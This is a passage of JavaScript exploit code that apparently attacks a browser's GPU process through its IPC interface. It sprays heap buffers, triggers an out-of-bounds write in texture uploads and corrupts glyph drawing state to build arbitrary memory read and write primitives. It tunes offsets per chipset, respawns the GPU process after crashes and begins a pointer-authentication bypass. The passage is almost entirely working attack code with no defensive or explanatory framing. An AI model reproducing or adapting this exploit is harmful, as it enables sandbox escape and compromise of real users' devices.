      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_Reshape, glConnection.identifier).encode('int32_t', width).encode('int32_t', height));
    }
    function RemoteGraphicsContextGL_CreateBuffer(bufferID) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CreateBuffer, glConnection.identifier).encode('uint32_t', bufferID));
    }
    function RemoteGraphicsContextGL_BindBuffer(target, bufferID) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_BindBuffer, glConnection.identifier).encode('uint32_t', target).encode('uint32_t', bufferID));
    }
    function RemoteGraphicsContextGL_BufferData0(target, size, usage) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_BufferData0, glConnection.identifier).encode('uint32_t', target).encode('uint64_t', BigInt(size)).encode('uint32_t', usage));
    }
    function RemoteGraphicsContextGL_BufferData1(target, data, usage) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_BufferData1, glConnection.identifier).encode('uint32_t', target).encode('uint64_t', BigInt(data.byteLength)).encode('bytes', data).encode('uint32_t', usage));
    }
    function RemoteGraphicsContextGL_PixelStorei(pname, param) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_PixelStorei, glConnection.identifier).encode('uint32_t', pname).encode('int32_t', param));
    }
    function RemoteGraphicsContextGL_CreateTexture(textureID) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CreateTexture, glConnection.identifier).encode('uint32_t', textureID));
    }
    function RemoteGraphicsContextGL_BindTexture(target, textureID) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_BindTexture, glConnection.identifier).encode('uint32_t', target).encode('uint32_t', textureID));
    }
    function RemoteGraphicsContextGL_TexImage2D1(target, level, internalformat, width, height, border, format, type, offset, timeout = Infinity) {
      if (!glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_TexImage2D1, glConnection.identifier).encode('uint32_t', target).encode('int32_t', level).encode('uint32_t', internalformat).encode('int32_t', width).encode('int32_t', height).encode('int32_t', border).encode('uint32_t', format).encode('uint32_t', type).encode('uint64_t', offset), timeout)) {
        LOG(`Crash detected during TexImage2D1 call`);
        return false;
      }
      return true;
    }
    function RemoteGraphicsContextGL_Flush() {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_Flush, glConnection.identifier));
    }
    function RemoteGraphicsContextGL_Finish() {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_Finish, glConnection.identifier));
    }
    function RemoteGraphicsContextGL_GetShaderSource() {
      const syncRequestID = nextIdentifier();
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_GetShaderSource, glConnection.identifier).encode('uint64_t', syncRequestID).encode('uint32_t', fragmentShader));
      return glConnection.receiveSyncReply(syncRequestID).decode8BitString();
    }
    let imageBufferIdentifiers = [];
    let dirtyWriteIndex = 0;
    let cache_id = 0;
    let dirty_read_count = 0;
    let glObjectIndex = 1;
    let fragmentShader = 0;
    function initGLProgram() {
      const vertexShader = glObjectIndex++;
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CreateShader, glConnection.identifier).encode('uint32_t', vertexShader).encode('uint32_t', GL_VERTEX_SHADER));
      LOG(`Vertex shader created. ID:${vertexShader}`);
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_ShaderSource, glConnection.identifier).encode('uint32_t', vertexShader).encode8BitString(`#version 300 es
                precision highp float;
                void main() {
                    gl_Position = vec4(1,1,1,0);
                }`));
      LOG("Vertex shader sourced");
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CompileShader, glConnection.identifier).encode('uint32_t', vertexShader));
      LOG("Vertex shader compiled");
      fragmentShader = glObjectIndex++;
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CreateShader, glConnection.identifier).encode('uint32_t', fragmentShader).encode('uint32_t', GL_FRAGMENT_SHADER));
      LOG(`Fragment shader created. ID:${fragmentShader}`);
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_ShaderSource, glConnection.identifier).encode('uint32_t', fragmentShader).encode8BitString(`#version 300 es
                precision highp float;
                out vec4 fragColor;
                void main() {
                    fragColor = vec4(1,1,1,0);
                }`));
      LOG("Fragment shader sourced");
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CompileShader, glConnection.identifier).encode('uint32_t', fragmentShader));
      LOG("Fragment shader compiled");
      const program = glObjectIndex++;
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CreateProgram, glConnection.identifier).encode('uint32_t', program));
      LOG(`Program has been created. ID:${program}`);
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_AttachShader, glConnection.identifier).encode('uint32_t', program).encode('uint32_t', vertexShader));
      LOG("Vertex shader has been attached");
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_AttachShader, glConnection.identifier).encode('uint32_t', program).encode('uint32_t', fragmentShader));
      LOG("Fragment shader has been attached");
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_LinkProgram, glConnection.identifier).encode('uint32_t', program));
      LOG("Program has been linked");
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_UseProgram, glConnection.identifier).encode('uint32_t', program));
      LOG("Program enabled");
      RemoteGraphicsContextGL_Flush();
    }
    function prepareLayout() {
      sprayBuffers(50, 0x4000);
      sprayBuffers(10, 0x20000);
      sprayBuffers(10, 0x4000 * 20);
      for (let i = 0; i < 30; i++) {
        RemoteRenderingBackend_CreateImageBuffer(backendConnection, 0x20, 0x80);
      }
    }
    function sprayBuffers(n, size) {
      for (let i = 0; i < n; i++) {
        const bufferID = glObjectIndex++;
        RemoteGraphicsContextGL_CreateBuffer(bufferID);
        RemoteGraphicsContextGL_BindBuffer(GL_ARRAY_BUFFER, bufferID);
        RemoteGraphicsContextGL_BufferData0(GL_ARRAY_BUFFER, size, GL_STATIC_DRAW);
      }
    }
    function texImage2D1(internalformat, format, type, width, height, timeout = Infinity) {
      let texture_01 = glObjectIndex++;
      RemoteGraphicsContextGL_CreateTexture(texture_01);
      RemoteGraphicsContextGL_BindTexture(GL_TEXTURE_2D, texture_01);
      return RemoteGraphicsContextGL_TexImage2D1(GL_TEXTURE_2D, 0, internalformat, width, height, 0, format, type, 0n, timeout = timeout);
    }
    function oob() {
      LOG(`oob()`);
      const width = 1;
      const height = 0x200;
      const smaller_height = 0x200 / 4;
      RemoteGraphicsContextGL_PixelStorei(GL_UNPACK_IMAGE_HEIGHT, smaller_height);
      const data32 = new Uint32Array(0x400);
      if (chipset === "f35b705e8c57ae59e369ebc9145a9dbc" || chipset === "43ba9900ff2fc7d9d32072540b2cab12" || chipset === "c90776dbac058ed6957f476e287867f8" || chipset === "22f32fd975a694d340a6ad22b872b1ae") {
        data32.fill(0xaac7ab, 0x80);
      } else {
        data32.fill(0x8015c8, 0x80);
      }
      const data = new Uint8Array(data32.buffer);
      const pixelUnpackBuffer = glObjectIndex++;
      RemoteGraphicsContextGL_CreateBuffer(pixelUnpackBuffer);
      RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, pixelUnpackBuffer);
      RemoteGraphicsContextGL_BufferData1(GL_PIXEL_UNPACK_BUFFER, data, GL_STATIC_DRAW);
      if (chipset === "43ba9900ff2fc7d9d32072540b2cab12" || chipset === "c90776dbac058ed6957f476e287867f8" || chipset === "22f32fd975a694d340a6ad22b872b1ae") {
        sprayBuffers(7, 0x100);
        sprayBuffers(0x1b - 1, 0x1000);
      } else {
        sprayBuffers(3, 0x100);
        sprayBuffers(0x1d - 1, 0x1000);
      }
      RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, 0);
      for (let i = 0; i < 12; i++) {
        texImage2D1(GL_DEPTH_COMPONENT32F, GL_DEPTH_COMPONENT, GL_FLOAT, width, height);
      }
      RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, pixelUnpackBuffer);
      prepare_layout_start = Date.now();
      prepareLayout();
      prepare_layout_end = Date.now();
      LOG(`[profiler] prepare_layout took ${prepare_layout_end - prepare_layout_start}ms`);
      if (chipset === "f35b705e8c57ae59e369ebc9145a9dbc" || chipset === "43ba9900ff2fc7d9d32072540b2cab12" || chipset === "c90776dbac058ed6957f476e287867f8" || chipset === "22f32fd975a694d340a6ad22b872b1ae") {
        sprayBuffers(1, 0x100);
        sprayBuffers(1, 0x200);
      } else {
        sprayBuffers(1, 0x100);
      }
      for (let i = 0; i < 2; i++) {
        RemoteRenderingBackend_CreateImageBuffer(backendConnection, 0x1000, 0x400 * 8);
      }
      for (let i = 0; i < 10; i++) {
        let imageBufferIdentifier = RemoteRenderingBackend_CreateImageBuffer(backendConnection, 0x20, 0x80);
        imageBufferIdentifiers.push(imageBufferIdentifier);
      }
      for (let i = 0; i < 3; i++) {
        RemoteRenderingBackend_CreateImageBuffer(backendConnection, 0x1000, 0x400 * 8);
      }
      RemoteGraphicsContextGL_TexImage2D1(GL_TEXTURE_2D, 0, GL_DEPTH_COMPONENT32F, width, height, 0, GL_DEPTH_COMPONENT, GL_FLOAT, 0n);
      RemoteImageBuffer_PutPixelBuffer(imageBufferIdentifiers[0], 0x20, 0x80);
      RemoteGraphicsContextGL_Flush();
      RemoteGraphicsContextGL_Finish();
      RemoteGraphicsContextGL_PixelStorei(GL_UNPACK_IMAGE_HEIGHT, 0);
      RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, 0);
      texImage2D1(GL_DEPTH_COMPONENT32F, GL_DEPTH_COMPONENT, GL_FLOAT, width, height);
      if (!texImage2D1(GL_DEPTH_COMPONENT32F, GL_DEPTH_COMPONENT, GL_FLOAT, 0x20, 0x20, timeout = crash_timeout)) {
        return false;
      }
      RemoteGraphicsContextGL_Flush();
      RemoteGraphicsContextGL_Finish();
      LOG(`FINISHED oob()`);
      return true;
    }
    function preparePrimitives() {
      LOG("preparePrimitives");
      cache_id = RemoteRenderingBackend_CacheFont();
      LOG(`Cache font ID: ${cache_id.hex()}`);
      for (let i = 0; i < 9; i++) {
        if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
      }
      const draw_glyphs_length = 0x6a8;
      const glyphs = new BigUint64Array(draw_glyphs_length / 0x8 * 0x2);
      glyphs[glyphs.length - 4] = 0n;
      glyphs[glyphs.length - 3] = 0n;
      glyphs[glyphs.length - 2] = 0x10000n;
      glyphs[glyphs.length - 1] = 0x20000n;
      const glyphs_u8 = new Uint8Array(glyphs.buffer, 0, draw_glyphs_length * 2);
      if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex], cache_id, glyphs_u8, new Uint8Array(draw_glyphs_length * 0x10), draw_glyphs_length, timeout = crash_timeout)) return false;
      for (let i = 0; i < 2; i++) {
        if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex + 1], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
      }
      const draw_glyphs_second_length = 0x6f0;
      const glyphs_second = new BigUint64Array(draw_glyphs_second_length / 0x8 * 0x2);
      let read_corruption_index = 0x1a6;
      for (let i = 0; i < 10; i++) {
        glyphs_second[read_corruption_index + 0] = 0n;
        glyphs_second[read_corruption_index + 1] = 0n;
        glyphs_second[read_corruption_index + 2] = 0x10000n;
        glyphs_second[read_corruption_index + 3] = 0x20000n;
        glyphs_second[read_corruption_index + 4] = offsets.emptyString - 0x18n;
        glyphs_second[read_corruption_index + 5] = 0n;
        read_corruption_index -= 0x10;
      }
      glyphs_second[glyphs_second.length - 6] = 0n;
      glyphs_second[glyphs_second.length - 5] = 0n;
      glyphs_second[glyphs_second.length - 4] = 0x10000n;
      glyphs_second[glyphs_second.length - 3] = 0x20000n;
      glyphs_second[glyphs_second.length - 2] = offsets.emptyString - 0x18n;
      glyphs_second[glyphs_second.length - 1] = 0x0n;
      const glyphs_second_u8 = new Uint8Array(glyphs_second.buffer, 0, draw_glyphs_second_length * 2);
      if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, glyphs_second_u8, new Uint8Array(draw_glyphs_second_length * 0x10), draw_glyphs_second_length, timeout = crash_timeout)) return false;
      let data = iterativeRead(offsets.RemoteGraphicsContextGLWorkQueue + 0x30n, 8n);
      if (!data) return false;
      let data_u64 = new BigUint64Array(data);
      let glThread = data_u64[0];
      LOG(`glThread: ${glThread.hex()}`);
      data = iterativeRead(glThread + 0x10n, 0x10n);
      if (!data) return false;
      data_u64 = new BigUint64Array(data);
      let pthread_ptr = data_u64[0];
      LOG(`pthread_ptr: ${pthread_ptr.hex()}`);
      let pthread_data = iterativeRead(pthread_ptr, 0xa00n);
      if (!pthread_data) return false;
      let pthread_data_u64 = new BigUint64Array(pthread_data);
      data = iterativeRead(offsets.GetCurrentThreadTLSIndex_CurrentThreadIndex, 8n);
      if (!data) return false;
      data_u64 = new BigUint64Array(data);
      const currentThreadIndex = data_u64[0];
      LOG(`currentThreadIndex: ${currentThreadIndex.hex()}`);
      const pthread_tls = pthread_data_u64[currentThreadIndex + 0x1en];
      LOG(`pthread_tls: ${pthread_tls.hex()}`);
      data = iterativeRead(pthread_tls + 0x638n, 8n);
      if (!data) return false;
      data_u64 = new BigUint64Array(data);
      const glBuffer = data_u64[0];
      ASSERT(glBuffer, `glBuffer is NULL`);
      LOG(`glBuffer: ${glBuffer.hex()}`);
      const glBuffer_data = iterativeRead(glBuffer + offsets.rxBufferMtl_off, 0x10n);
      if (!glBuffer_data) return false;
      const glBuffer_data_u64 = new BigUint64Array(glBuffer_data);
      const rxBufferMtl = glBuffer_data_u64[0];
      LOG(`rxBufferMtl: ${rxBufferMtl.hex()}`);
      const rxBufferMtl_data = iterativeRead(rxBufferMtl + offsets.rxMtlBuffer_off, 8n);
      if (!rxBufferMtl_data) return false;
      const rxBufferMtl_data_u64 = new BigUint64Array(rxBufferMtl_data);
      const rxMtlBuffer = rxBufferMtl_data_u64[0];
      LOG(`rxMtlBuffer: ${rxMtlBuffer.hex()}`);
      const rxMtlBuffer_data = iterativeRead(rxMtlBuffer, 0x20n);
      if (!rxMtlBuffer_data) return false;
      const rxMtlBuffer_data_u64 = new BigUint64Array(rxMtlBuffer_data);
      const AGXA13FamilyBuffer = rxMtlBuffer_data_u64[3];
      LOG(`AGXA13FamilyBuffer: ${AGXA13FamilyBuffer.hex()}`);
      const write_addr = pthread_tls + offsets.privateState_off + offsets.vertexAttribVector_off;
      const write_value = AGXA13FamilyBuffer + 0xa0n;
      for (let i = 0; i < 7; i++) {
        if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex + 1], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
      }
      const draw_glyphs_third_length = 0x688;
      const glyphs_third = new BigUint64Array(draw_glyphs_third_length / 0x8 * 0x2);
      glyphs_third[glyphs_third.length - 6] = 0n;
      glyphs_third[glyphs_third.length - 5] = 0n;
      glyphs_third[glyphs_third.length - 4] = 0x10000n;
      glyphs_third[glyphs_third.length - 3] = 0x20000n;
      glyphs_third[glyphs_third.length - 2] = write_addr - 0x30n;
      glyphs_third[glyphs_third.length - 1] = 0x0n;
      const glyphs_third_u8 = new Uint8Array(glyphs_third.buffer, 0, draw_glyphs_third_length * 2);
      if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, glyphs_third_u8, new Uint8Array(draw_glyphs_third_length * 0x10), draw_glyphs_third_length, timeout = crash_timeout)) return false;
      RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 3], 0n, 0n, 0n, write_value, write_value + 0x140n, write_value + 0x140n);
      if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 3], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
      return true;
    }
    function iterativeRead(address, size) {
      if (dirty_read_count++ != 0) {
        if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, new Uint8Array(0x10), new Uint8Array(0x80), 8, timeout = crash_timeout)) return false;
      }
      RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 2], size << 32n | 3n, address, 0x0000000049ac480cn, 0n, 0n, 0n);
      if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 2], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
      const leak = RemoteGraphicsContextGL_GetShaderSource();
      if (leak.byteLength != size) {
        crashGPUProcess(`leak size mismatch (expected: ${size}, actual: ${leak.byteLength})`);
        return false;
      }
      return leak;
    }
    function copy_to_gpu(addr, buffer) {
      ASSERT(addr > 0x100000000n, `copy_to_gpu(): tried to write to ${addr.hex()}`);
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_VertexAttrib4f, glConnection.identifier).encode('uint32_t', 0).encode('uint32_t', Number(addr & 0xffffffffn)).encode('uint32_t', Number(addr >> 32n)).encode('float', 0).encode('float', 0));
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_BufferSubData, glConnection.identifier).encode('uint32_t', GL_ARRAY_BUFFER).encode('uint64_t', 0n).encode('uint64_t', BigInt(buffer.byteLength)).encode('bytes', buffer));
    }
    const gpu_slow_write64_u64 = new BigUint64Array(1);
    const gpu_slow_write64_u8 = new Uint8Array(gpu_slow_write64_u64.buffer);
    function gpu_slow_write64(addr, value) {
      ASSERT(addr > 0x100000000n, `gpu_slow_write64(): tried to write to ${addr.hex()}`);
      gpu_slow_write64_u64[0] = value;
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_VertexAttrib4f, glConnection.identifier).encode('uint32_t', 0).encode('uint32_t', Number(addr & 0xffffffffn)).encode('uint32_t', Number(addr >> 32n)).encode('float', 0).encode('float', 0));
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_BufferSubData, glConnection.identifier).encode('uint32_t', GL_ARRAY_BUFFER).encode('uint64_t', 0n).encode('uint64_t', 8n).encode('bytes', gpu_slow_write64_u8));
    }
    function gpu_slow_write16(ptr, u16) {
      let value = gpu_slow_read64(ptr);
      value &= ~0xffffn;
      value |= u16;
      gpu_slow_write64(ptr, value);
    }
    function copy_from_gpu(addr, size, assert_enable = true) {
      const data = new BigUint64Array(2);
      const data_u8 = new Uint8Array(data.buffer);
      data[0] = size << 32n | 3n;
      data[1] = addr;
      copy_to_gpu(offsets.emptyString, data_u8);
      const leak = RemoteGraphicsContextGL_GetShaderSource();
      if (assert_enable) {
        ASSERT(leak.byteLength == size, "gpuRead(): leak.byteLength == size");
      }
      return leak;
    }
    function gpu_slow_read64(addr) {
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_VertexAttrib4f, glConnection.identifier).encode('uint32_t', 0).encode('uint32_t', Number(addr & 0xffffffffn)).encode('uint32_t', Number(addr >> 32n)).encode('float', 0).encode('float', 0));
      const replyID = nextIdentifier();
      glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_GetBufferSubDataInline, glConnection.identifier).encode('uint64_t', replyID).encode('uint32_t', GL_ARRAY_BUFFER).encode('uint64_t', 0n).encode('uint64_t', 8n));
      const decoder = glConnection.receiveSyncReply(replyID);
      const size = decoder.decode('uint64_t');
      const data = decoder.decode('uint64_t');
      return data;
    }
    function gpu_slow_read32(addr) {
      return gpu_slow_read64(addr) & 0xffffffffn;
    }
    function crashGPUProcess(reason) {
      LOG(`crashGPUProcess("${reason}")`);
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive();
      return;
    }
    function gpuProcessConnectionClosed() {
      fcall(offsets.WebProcess_gpuProcessConnectionClosed, webProcess);
    }
    function ensureGPUProcessConnection() {
      fcall(offsets.pthread_setspecific, runLoopHolder_tid, offsets.mainRunLoop);
      fcall(offsets.WebProcess_ensureGPUProcessConnection, webProcess);
      fcall(offsets.pthread_setspecific, runLoopHolder_tid, 0n);
    }
    function respawn_gpu_process_and_retry() {
      LOG(`[-] going to respawn gpu process`);
      gpuProcessConnectionClosed();
      ensureGPUProcessConnection();
      gpuProcessConnection = read64(webProcess + 0x158n);
      LOG(`new gpuProcessConnection: ${gpuProcessConnection.hex()}`);
      const connection = read64(gpuProcessConnection + 0x20n);
      LOG(`waiting for sendPort`);
      read64_biguint64arr[1] = connection + 0x138n;
      while (!read64_str.charCodeAt(0));
      LOG(`received sendPort`);
      const maybe_port = read32(connection + 0x138n);
      LOG(`maybe_port: ${maybe_port.hex()}`);
      gpuConnection = new Connection(connection, true, "respawned gpu connection");
      gpuProcessConnectionIdentifier = read64(gpuProcessConnection + offsets.m_gpuProcessConnection_m_identifier);
      SBX0();
      return false;
    }
    function findGPUConnectionToWebProcess() {
      let our_GPUConnectionToWebProcess = NaN;
      const m_webProcessConnections_Map = gpu_slow_read64(offsets.GPUProcess_singleton + offsets.m_webProcessConnections);
      const m_webProcessConnections_MapData = gpu_slow_read_hashmap(m_webProcessConnections_Map);
      for (const identifier of m_webProcessConnections_MapData.keys()) {
        const current_GPUConnectionToWebProcess = m_webProcessConnections_MapData.get(identifier);
        const m_remoteGraphicsContextGL_Map = gpu_slow_read64(current_GPUConnectionToWebProcess + offsets.GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap);
        if (m_remoteGraphicsContextGL_Map) {
          const m_remoteGraphicsContextGL_MapData = gpu_slow_read_hashmap(m_remoteGraphicsContextGL_Map);
          if (m_remoteGraphicsContextGL_MapData.get(glConnection.identifier)) {
            our_GPUConnectionToWebProcess = current_GPUConnectionToWebProcess;
            LOG(`Found our GPUConnectionToWebProcess: ${our_GPUConnectionToWebProcess.hex()}`);
            break;
          }
        }
      }
      return our_GPUConnectionToWebProcess;
    }
    function restoreCoreAnimationHeaders(restoration_count = 4) {
      let our_GPUConnectionToWebProcess = findGPUConnectionToWebProcess();
      if (our_GPUConnectionToWebProcess) {
        let our_RenderingBackend = NaN;
        const m_remoteRenderingBackend_Map = gpu_slow_read64(our_GPUConnectionToWebProcess + offsets.m_remoteRenderingBackendMap);
        if (m_remoteRenderingBackend_Map) {
          const m_remoteRenderingBackend_MapData = gpu_slow_read_hashmap(m_remoteRenderingBackend_Map);
          our_RenderingBackend = m_remoteRenderingBackend_MapData.get(backendConnection.identifier);
        }
        if (our_RenderingBackend) {
          LOG(`Found our RenderingBackend: ${our_RenderingBackend.hex()}`);
          const m_remoteDisplayLists = gpu_slow_read64(our_RenderingBackend + offsets.m_remoteDisplayLists);
          if (m_remoteDisplayLists) {
            LOG(`m_remoteDisplayLists: ${m_remoteDisplayLists.hex()}`);
            const m_remoteDisplayListsMapData = gpu_slow_read_hashmap(m_remoteDisplayLists);
            for (let i = 0; i < restoration_count; i++) {
              const remote_display_list_recorder = m_remoteDisplayListsMapData.get(imageBufferIdentifiers[i]);
              if (remote_display_list_recorder) {
                LOG(`Image ID: ${imageBufferIdentifiers[i].hex()} - remote_display_list_recorder: ${remote_display_list_recorder.hex()}`);
                const m_imageBuffer = gpu_slow_read64(remote_display_list_recorder + offsets.m_imageBuffer);
                LOG(`\tm_imageBuffer: ${m_imageBuffer.hex()}`);
                const m_backend = gpu_slow_read64(m_imageBuffer + offsets.m_backend);
                LOG(`\tm_backend: ${m_backend.hex()}`);
                const m_platformContext = gpu_slow_read64(m_backend + offsets.m_platformContext);
                LOG(`\tm_platformContext: ${m_platformContext.hex()}`);
                const CGContextDelegate = gpu_slow_read64(m_platformContext + offsets.CGContextDelegate);
                LOG(`\tCGContextDelegate: ${CGContextDelegate.hex()}`);
                const IOSurfaceContextDelegate = gpu_slow_read64(CGContextDelegate + offsets.IOSurfaceContextDelegate);
                LOG(`\tIOSurfaceContextDelegate: ${IOSurfaceContextDelegate.hex()}`);
                const IOSurfaceDrawable = gpu_slow_read64(IOSurfaceContextDelegate + offsets.IOSurfaceDrawable);
                LOG(`\tIOSurfaceDrawable: ${IOSurfaceDrawable.hex()}`);
                const IOSurfaceQueue = gpu_slow_read64(IOSurfaceDrawable + offsets.IOSurfaceQueue);
                LOG(`\tIOSurfaceQueue: ${IOSurfaceQueue.hex()}`);
                const CAPointer = gpu_slow_read64(IOSurfaceQueue + offsets.CAPointer);
                LOG(`\tCAPointer: ${CAPointer.hex()}`);
                LOG("\tCA Header Before restoration");
                for (let j = 0; j < 5; j++) {
                  LOG(`\t\t${(CAPointer + BigInt(j) * 8n).hex()} : ${gpu_slow_read64(CAPointer + BigInt(j) * 8n).hex()}`);
                }
                gpu_slow_write64(CAPointer, 0x0n);
                gpu_slow_write64(CAPointer + 0x8n, 0x0n);
                gpu_slow_write64(CAPointer + 0x10n, 0x4000n);
                gpu_slow_write64(CAPointer + 0x18n, 0x4000n);
                gpu_slow_write64(CAPointer + 0x20n, CAPointer);
                LOG("\tCA Header After restoration");
                for (let j = 0; j < 5; j++) {
                  LOG(`\t\t${(CAPointer + BigInt(j) * 8n).hex()} : ${gpu_slow_read64(CAPointer + BigInt(j) * 8n).hex()}`);
                }
              }
            }
          }
        }
      }
    }
    if (retry_count == 1) {
      crashGPUProcess('process cleanup');
      return respawn_gpu_process_and_retry();
    }
    const backendConnection = new StreamClientConnection(nextIdentifier(), 0x100000n);
    const glConnection = new StreamClientConnection(nextIdentifier(), 0x30000n);
    LOG(`backendConnection.identifier: ${backendConnection.identifier.hex()}`);
    LOG(`glConnection.identifier: ${glConnection.identifier.hex()}`);
    GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection);
    GPUConnectionToWebProcess_CreateGraphicsContextGL();
    RemoteGraphicsContextGL_Reshape();
    initGLProgram();
    if (!oob()) {
      LOG("GPU crashed at agx oob");
      return respawn_gpu_process_and_retry();
    }
    if (!preparePrimitives()) {
      LOG("GPU crashed at CoreAnimation oob");
      return respawn_gpu_process_and_retry();
    }
    gpu_slow_write64(offsets.free_slabs, 0n);
    LOG(`offsets.free_slabs: ${offsets.free_slabs.hex()}`);
    restoreCoreAnimationHeaders(restoration_count = 4);
    sbx0_rw_end = Date.now();
    LOG(`[profiler] sbx0 (read/write) took ${sbx0_rw_end - sbx0_rw_begin}ms`);
    LOG('gpu pac bypass start');
    const sbx0_pac_begin = Date.now();
    const backendConnection2 = new StreamClientConnection(nextIdentifier(), 0x4000n);
    const backendConnection3 = new StreamClientConnection(nextIdentifier(), 0x4000n);
    const backendConnection4 = new StreamClientConnection(nextIdentifier(), 0x4000n);
    LOG(`backendConnection2.identifier: ${backendConnection2.identifier.hex()}`);
    LOG(`backendConnection3.identifier: ${backendConnection3.identifier.hex()}`);
    LOG(`backendConnection4.identifier: ${backendConnection4.identifier.hex()}`);
    GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection2);
    GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection3);
    GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection4);
    const imageBufferIdentifier1 = RemoteRenderingBackend_CreateImageBuffer(backendConnection2);
    LOG(`imageBufferIdentifier1: ${imageBufferIdentifier1.hex()}`);
    const imageBufferIdentifier2 = RemoteRenderingBackend_CreateImageBuffer(backendConnection2);
    LOG(`imageBufferIdentifier2: ${imageBufferIdentifier2.hex()}`);
    const imageBufferIdentifier3 = RemoteRenderingBackend_CreateImageBuffer(backendConnection3);
    LOG(`imageBufferIdentifier3: ${imageBufferIdentifier3.hex()}`);
    const imageBufferIdentifier4 = RemoteRenderingBackend_CreateImageBuffer(backendConnection3);
    LOG(`imageBufferIdentifier4: ${imageBufferIdentifier4.hex()}`);
    const imageBufferIdentifier5 = RemoteRenderingBackend_CreateImageBuffer(backendConnection4);
    LOG(`imageBufferIdentifier5: ${imageBufferIdentifier5.hex()}`);
    const imageBufferIdentifier6 = RemoteRenderingBackend_CreateImageBuffer(backendConnection4);
    LOG(`imageBufferIdentifier6: ${imageBufferIdentifier6.hex()}`);
    function gpu_slow_read_hashmap(map_ptr, key_size = 8n, element_size = 8n) {
      const map_length = gpu_slow_read64(map_ptr - 8n) >> 32n;
      const entry_size = key_size + element_size;
      const buffer_size = entry_size * map_length;
      const map_buffer = copy_from_gpu(map_ptr, buffer_size);
      const map_buffer_u64 = new BigUint64Array(map_buffer);
      const res = new Map();
      for (let offset = 0n; offset < buffer_size; offset += entry_size) {
        const key = map_buffer_u64[offset / 8n];
        if (key) {
          const value = map_buffer_u64[(offset + key_size) / 8n];
          res.set(key, value);
        }
      }
      return res;
    }
    const webProcessConnectionsMap = gpu_slow_read64(offsets.GPUProcess_singleton + 0x80n);
    LOG(`webProcessConnectionsMap: ${webProcessConnectionsMap.hex()}`);
    const webProcessConnectionsMapData = gpu_slow_read_hashmap(webProcessConnectionsMap);
